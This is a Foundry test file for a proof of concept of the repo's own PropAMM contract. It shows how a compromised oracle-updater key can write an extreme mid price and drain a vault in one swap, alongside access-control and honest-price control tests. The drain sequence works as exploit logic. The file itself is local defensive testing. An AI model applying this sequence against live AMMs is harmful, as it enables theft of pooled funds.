// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {PropAMM, InsufficientOutput, EmptyVault} from "../src/PropAMM.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {MockPURAuthenticated} from "./mocks/MockPURAuthenticated.sol";

/// @title Capitán Monasterio — a malicious maker modeled on ElZorro's real architecture
/// @notice Security PoC for a compromised/malicious oracle-updater key, built on this repo's own
/// `PropAMM.sol` and a faithful (access-controlled) oracle mock. Fully local: no RPC, no mainnet
/// fork, `vm.etch` at the same address `PropAMM.t.sol` uses for the oracle.
///
/// Revised after review: the first version of this PoC used the repo's shared `MockPUR`, whose
/// `setState` has no access control, so `vm.prank(updater)` was decorative — every test passed
/// with any `msg.sender`, which proved nothing about what a compromised updater KEY specifically
/// enables. It also framed ordinary quote-and-pull (an honest updater's price changing between a
/// taker's `quote()` read and its `swap()` landing, which `minAmountOut` already bounds) as if it
/// were the compromise scenario. This version fixes both: `MockPURAuthenticated` enforces
/// `isUpdater`, so only the address `PropAMM.initialize` actually registered can write, and a
/// dedicated test (`test_compromisedUpdaterKey_drainsVaultWithAdverseMid`) models the scenario a
/// compromised key genuinely enables — setting an adverse `mid` and draining the vault in one
/// transaction — which the earlier version did not cover.
contract CapitanMonasterioQuoteAndPullTest is Test {
    // The oracle address PropAMM.sol's tests etch a mock onto (see `PropAMM.t.sol`).
    address constant ORACLE = 0xDa7AfEeD021EAFC1c1Af9C362dE477DaD0396B81;
    uint256 constant PRICE_SCALE = 1e18; // PropAMM.PRICE_SCALE
    uint256 constant AMOUNT_IN = 1 ether;
    uint256 constant VAULT_TOKEN_OUT_BALANCE = 10_000 ether;
    uint256 constant HONEST_MID = 2_500 * PRICE_SCALE;

    MockERC20 internal tokenIn;
    MockERC20 internal tokenOut;
    PropAMM internal propAmm;

    address internal owner = makeAddr("owner");
    address internal vault = makeAddr("vault");
    // The authorized price-updater key. In production this is the maker's own quote-updater
    // service; "a compromised key" means this exact address, under someone else's control.
    address internal updater = makeAddr("updater");
    address internal taker = makeAddr("taker");
    address internal attacker = makeAddr("unauthorized-attacker");

    function setUp() public {
        vm.etch(ORACLE, address(new MockPURAuthenticated()).code);

        tokenIn = new MockERC20();
        tokenOut = new MockERC20();

        address[] memory updaters = new address[](1);
        updaters[0] = updater;
        PropAMM.PairConfig[] memory pairs = new PropAMM.PairConfig[](1);
        pairs[0] = PropAMM.PairConfig({token0: address(tokenIn), token1: address(tokenOut), vault: vault});

        address implementation = address(new PropAMM());
        propAmm = PropAMM(
            address(
                new ERC1967Proxy(
                    implementation, abi.encodeCall(PropAMM.initialize, (owner, updaters, ORACLE, pairs))
                )
            )
        );

        tokenOut.mint(vault, VAULT_TOKEN_OUT_BALANCE);
        vm.prank(vault);
        tokenOut.approve(address(propAmm), type(uint256).max);
    }

    function _updatePriceAs(address caller, uint256 delta, uint256 mid) internal {
        vm.prank(caller);
        MockPURAuthenticated(ORACLE).setState(delta, mid);
    }

    /// @dev Mirrors the router's push-payment model: `tokenIn` lands on the venue contract before
    /// `swap()` is called, so calling `swap()` directly here needs the same pre-transfer.
    function _fundTakerAndPush(MockERC20 tIn, address venue, address from, uint256 amountIn) internal {
        tIn.mint(from, amountIn);
        vm.prank(from);
        tIn.transfer(venue, amountIn);
    }

    /// @dev `new MockERC20()` addresses are `keccak256(this, nonce)` — deterministic given the
    /// same deployer and call sequence, not random, and NOT ordered by deploy sequence either (the
    /// hash doesn't preserve "deployed first" as "numerically smaller"). Re-running the same test
    /// always lands on the same relative order, so proving the drain holds under BOTH orderings of
    /// `tokenIn`/`tokenOut` needs forcing each one, not re-running and hoping. Bounded retry: each
    /// draw is close to a coin flip over which address comes out smaller, so 64 draws make missing
    /// either order for 64 consecutive tries astronomically unlikely.
    function _deployWithForcedOrder(bool wantTokenInIsToken0)
        internal
        returns (MockERC20 tIn, MockERC20 tOut, PropAMM amm, address vlt)
    {
        for (uint256 i = 0; i < 64; i++) {
            MockERC20 candidateIn = new MockERC20();
            MockERC20 candidateOut = new MockERC20();
            if ((address(candidateIn) < address(candidateOut)) == wantTokenInIsToken0) {
                tIn = candidateIn;
                tOut = candidateOut;
                break;
            }
        }
        require(address(tIn) != address(0), "could not find the requested token order in 64 draws");

        vlt = makeAddr(wantTokenInIsToken0 ? "vault-tokenIn-is-token0" : "vault-tokenOut-is-token0");

        address[] memory updaters = new address[](1);
        updaters[0] = updater;
        PropAMM.PairConfig[] memory pairs = new PropAMM.PairConfig[](1);
        pairs[0] = PropAMM.PairConfig({token0: address(tIn), token1: address(tOut), vault: vlt});

        amm = PropAMM(
            address(
                new ERC1967Proxy(
                    address(new PropAMM()), abi.encodeCall(PropAMM.initialize, (owner, updaters, ORACLE, pairs))
                )
            )
        );

        tOut.mint(vlt, VAULT_TOKEN_OUT_BALANCE);
        vm.prank(vlt);
        tOut.approve(address(amm), type(uint256).max);
    }

    //------------------------------
    // Access control: is "the updater key" actually required?
    //------------------------------

    /// @notice Proves the oracle mock's authorization is real, not decorative: an address never
    /// registered via `PropAMM.initialize`/`addUpdater` cannot write a price, full stop. This is
    /// the precondition every "compromised key" scenario below depends on — without it, "the
    /// attacker holds the updater key" and "anyone can write" are indistinguishable.
    function test_unauthorizedCallerCannotWritePrice_accessControlEnforced() public {
        vm.prank(attacker);
        vm.expectRevert(abi.encodeWithSelector(MockPURAuthenticated.NotAnUpdater.selector, attacker));
        MockPURAuthenticated(ORACLE).setState(0, HONEST_MID);
    }

    //------------------------------
    // The actual compromised-key scenario: an adverse mid, drained in one transaction
    //------------------------------

    /// @notice What a compromised updater key genuinely enables, per the review this PoC was
    /// revised against: the key is real and authorized (this is not a bypass of the access
    /// control proven above), so whoever holds it can write ANY `mid` — `_pricing` only checks
    /// `mid != 0` (`PropAMM.sol:298`), with no comparison against an external reference.
    ///
    /// CORRECTION from a second review (3 points, all confirmed independently before fixing):
    /// 1. An earlier version always wrote a LOW `adverseMid` and asserted only that the vault's
    ///    `tokenOut` balance dropped. That is only an attack when `tokenOut` is token0 — `mid`
    ///    prices token0 in token1 (`PropAMM.sol:306-310`), so which direction counts as "cheap for
    ///    the attacker" flips with deploy-time token ordering. The version that shipped happened
    ///    to deploy with `tokenIn` as token0, where a LOW mid makes `tokenOut` MORE expensive: the
    ///    logged run paid ~400 `tokenIn` (worth 1,000,000 `tokenOut` at the honest price) for only
    ///    10,000 `tokenOut` — the attacker overpaid massively, the opposite of a drain.
    /// 2. The fix after that picked `adverseMid` per the actual token order, and the writeup
    ///    claimed re-running the test 5 times "confirmed it's not order-flaky." Wrong: `new
    ///    MockERC20()` addresses are `keccak256(this, nonce)` — deterministic given the same
    ///    deployer and call sequence, so re-running the identical test always lands on the same
    ///    order. The 5 runs were 5 copies of the same branch; the other branch was never executed.
    ///    Fixed here by forcing each order explicitly (`_deployWithForcedOrder`) and testing both
    ///    as separate cases, rather than letting whichever order comes out of `setUp` stand in for
    ///    "both."
    /// 3. The value assertion was `assertLt(after, before)`, which a 1-wei loss also satisfies —
    ///    it couldn't tell a real drain from a rounding error. Fixed by requiring the vault's value
    ///    drop to less than 5% of its starting value (it drops to about 1%; 5% leaves slack for
    ///    `_priceImpact`/rounding without being a tautology).
    function test_compromisedUpdaterKey_drainsVaultWithAdverseMid_tokenInIsToken0() public {
        _runDrainScenario(true);
    }

    /// @notice Same scenario, token order forced the other way: `tokenOut` is token0, so the mid
    /// that makes it cheap for the attacker is a LOW one instead of a HIGH one. Exercises the
    /// branch the single-order version never ran.
    function test_compromisedUpdaterKey_drainsVaultWithAdverseMid_tokenOutIsToken0() public {
        _runDrainScenario(false);
    }

    function _runDrainScenario(bool tokenInIsToken0) internal {
        (MockERC20 tIn, MockERC20 tOut, PropAMM amm, address vlt) = _deployWithForcedOrder(tokenInIsToken0);
        assertEq(address(tIn) < address(tOut), tokenInIsToken0, "forced order sanity check");

        _updatePriceAs(updater, 0, HONEST_MID);

        // `_pricing`: tokenIn==token0 -> amountOut = amountIn*mid/SCALE (higher mid = more out);
        // tokenOut==token0 -> amountOut = amountIn*SCALE/mid (lower mid = more out). Either way,
        // this is the mid that makes tokenOut cheap for whoever is buying it with tokenIn.
        uint256 adverseMid = tokenInIsToken0 ? HONEST_MID * 100 : HONEST_MID / 100;
        _updatePriceAs(updater, 0, adverseMid);

        // Ask the contract itself for the largest single fill it will pay out at this price,
        // rather than assuming a size: `quoteFillable` is what the router's split path uses for
        // exactly this ("the most this pair can pay"), so reusing it keeps the attacker's input
        // size honest to the contract's own cap instead of hand-picked.
        (uint256 maxFillableIn, uint256 expectedOut) =
            amm.quoteFillable(address(tIn), address(tOut), type(uint128).max);

        _fundTakerAndPush(tIn, address(amm), attacker, maxFillableIn);
        vm.prank(attacker);
        uint256 amountOut = amm.swap(address(tIn), address(tOut), maxFillableIn, expectedOut, attacker, block.timestamp);

        assertEq(amountOut, expectedOut, "drained exactly what quoteFillable priced at the adverse mid");

        // Value check, not a unit count: convert what the vault now holds in tokenIn back to its
        // tokenOut-equivalent AT THE HONEST PRICE, using the same tokenIn/tokenOut-ordering
        // formula `_pricing` itself uses, and compare the total against the vault's starting
        // value — and require the drop to be material (below 5% of starting value), not just any
        // drop, so a 1-wei loss couldn't pass this assertion the way it could before.
        uint256 vaultTokenInBalance = tIn.balanceOf(vlt);
        uint256 vaultTokenInValueInTokenOut = tokenInIsToken0
            ? vaultTokenInBalance * HONEST_MID / PRICE_SCALE
            : vaultTokenInBalance * PRICE_SCALE / HONEST_MID;
        uint256 vaultTotalValueAfterAtHonestPrice = tOut.balanceOf(vlt) + vaultTokenInValueInTokenOut;

        assertLt(
            vaultTotalValueAfterAtHonestPrice,
            VAULT_TOKEN_OUT_BALANCE * 5 / 100,
            "vault's total value (tokenOut left + tokenIn received, both at the honest price) should drop below 5% of its starting value, not just any amount"
        );
        emit log_named_uint("tokenOut drained in one tx", amountOut);
        emit log_named_uint("tokenIn the attacker paid for it", maxFillableIn);
        emit log_named_uint("vault tokenOut balance remaining", tOut.balanceOf(vlt));
        emit log_named_uint("vault total value after, at honest price (tokenOut units)", vaultTotalValueAfterAtHonestPrice);
        emit log_named_uint("vault starting value (tokenOut units)", VAULT_TOKEN_OUT_BALANCE);
    }

    //------------------------------
    // Control: ordinary quote-and-pull under an HONEST updater is not this vulnerability
    //------------------------------

    /// @notice Baseline: an honest updater, no pull. What a normal fill looks like.
    function test_noPull_honestFillBaseline() public {
        _updatePriceAs(updater, 0, HONEST_MID);
        uint256 expected = propAmm.quote(address(tokenIn), address(tokenOut), AMOUNT_IN);

        _fundTakerAndPush(tokenIn, address(propAmm), taker, AMOUNT_IN);
        vm.prank(taker);
        uint256 amountOut = propAmm.swap(address(tokenIn), address(tokenOut), AMOUNT_IN, expected, taker, block.timestamp);

        assertEq(amountOut, expected, "honest fill should settle at the quoted price");
    }

    /// @notice NOT a vulnerability: with an honest updater, the oracle's price can still change
    /// between a taker's `quote()` read and its `swap()` landing — every maker in this system does
    /// this on an ordinary schedule, it is not a compromise. `swap()` re-quotes fresh
    /// (`PropAMM.sol:168`) and a tight `minAmountOut` (pinned to the price the taker saw) makes
    /// that fresh quote fail its own floor, so the swap reverts (`InsufficientOutput`) rather than
    /// settling at a worse price. The taker loses only gas. Kept as a control to distinguish this
    /// from the compromised-key scenario above.
    function test_honestPriceChangeBetweenQuoteAndSwap_tightMinOut_reverts() public {
        _updatePriceAs(updater, 0, HONEST_MID);
        uint256 amountOutMinFromEarlierQuote = propAmm.quote(address(tokenIn), address(tokenOut), AMOUNT_IN);

        _updatePriceAs(updater, 50 * PRICE_SCALE / 10_000, HONEST_MID); // honest 50bps spread update

        _fundTakerAndPush(tokenIn, address(propAmm), taker, AMOUNT_IN);
        vm.prank(taker);
        // Selector-only: the exact second argument also bakes in `_priceImpact`'s charge for this
        // fill's size against the vault, incidental to this scenario.
        vm.expectPartialRevert(InsufficientOutput.selector);
        propAmm.swap(address(tokenIn), address(tokenOut), AMOUNT_IN, amountOutMinFromEarlierQuote, taker, block.timestamp);
    }

    /// @notice Same honest price change, but with a loose `minAmountOut` (a generic slippage
    /// tolerance the taker itself declared): the swap succeeds at the new, slightly worse price,
    /// within the tolerance the taker accepted going in. Not a silent loss beyond what was
    /// disclosed.
    function test_honestPriceChangeBetweenQuoteAndSwap_looseMinOut_withinDeclaredTolerance() public {
        _updatePriceAs(updater, 0, HONEST_MID);
        uint256 earlierQuote = propAmm.quote(address(tokenIn), address(tokenOut), AMOUNT_IN);

        _updatePriceAs(updater, 50 * PRICE_SCALE / 10_000, HONEST_MID);

        uint256 looseMinOut = earlierQuote * 95 / 100; // a 5% slippage tolerance the taker declared

        _fundTakerAndPush(tokenIn, address(propAmm), taker, AMOUNT_IN);
        vm.prank(taker);
        uint256 amountOut = propAmm.swap(address(tokenIn), address(tokenOut), AMOUNT_IN, looseMinOut, taker, block.timestamp);

        assertGe(amountOut, looseMinOut, "fill must clear the taker's own declared floor");
        assertLt(amountOut, earlierQuote, "price moved against the taker, as an honest update can");
    }

    /// @notice Control, not an exploit: if the vault behind a pair holds no `tokenOut`, `quote()`
    /// reverts BEFORE any fill is attempted (`EmptyVault`, `PropAMM.sol:304`). Included to show
    /// this failure mode is already covered, unlike an adverse-mid write.
    function test_phantomDepth_emptyVaultCaughtAtQuoteNotAtFill() public {
        address starvedVault = makeAddr("starved-vault");
        vm.prank(owner);
        propAmm.setPairVault(address(tokenIn), address(tokenOut), starvedVault);

        _updatePriceAs(updater, 0, HONEST_MID);

        vm.expectRevert(abi.encodeWithSelector(EmptyVault.selector, address(tokenOut)));
        propAmm.quote(address(tokenIn), address(tokenOut), AMOUNT_IN);
    }
}
